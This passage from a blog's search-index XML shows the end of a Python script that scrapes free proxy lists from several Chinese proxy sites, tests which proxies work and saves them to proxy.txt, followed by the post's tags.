number">200</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>active_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ip_list<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[+] %s是可用的"</span> <span class="token operator">%</span> ip_list<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>    <span class="token keyword">def</span> <span class="token function">save_active</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 正在写入本地文件\"%s写入可用代理信息\""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/proxy.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'proxy.txt'</span><span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">for</span> info <span class="token keyword">in</span> self<span class="token punctuation">.</span>active_infos<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 写入完成"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>detect_open<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]本次检测中可用的代理站点地址数共 %d 个，不可用地址数共 %d 个"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>alive_site<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>total_website<span class="token punctuation">)</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>alive_site<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>alive_site<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 所有的站点均不可用，将直接退出程序!"</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> website <span class="token keyword">in</span> self<span class="token punctuation">.</span>alive_site<span class="token punctuation">:</span>                <span class="token keyword">if</span> website <span class="token operator">==</span> self<span class="token punctuation">.</span>ip89_proxy <span class="token operator">+</span> <span class="token string">"1.html"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>get_ip89_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> website <span class="token operator">==</span> self<span class="token punctuation">.</span>ip66_proxy<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>get_ip66_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> website <span class="token operator">==</span> self<span class="token punctuation">.</span>kuai_proxy<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>get_kuai_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> website <span class="token operator">==</span> self<span class="token punctuation">.</span>xici_proxy<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>get_xici_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>merge_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 经过对爬取到的代理信息组合、去重后还剩下：%d 条代理信息"</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>check_active<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>save_active<span class="token punctuation">(</span><span class="token punctuation">)</span>MaintainProxyPool<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Tips：如果有侵权的地方，请第一时间联系我，我会马上处理"><a href="#Tips：如果有侵权的地方，请第一时间联系我，我会马上处理" class="headerlink" title="Tips：如果有侵权的地方，请第一时间联系我，我会马上处理"></a>Tips：如果有侵权的地方，请第一时间联系我，我会马上处理</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python、Spider </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Spider </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
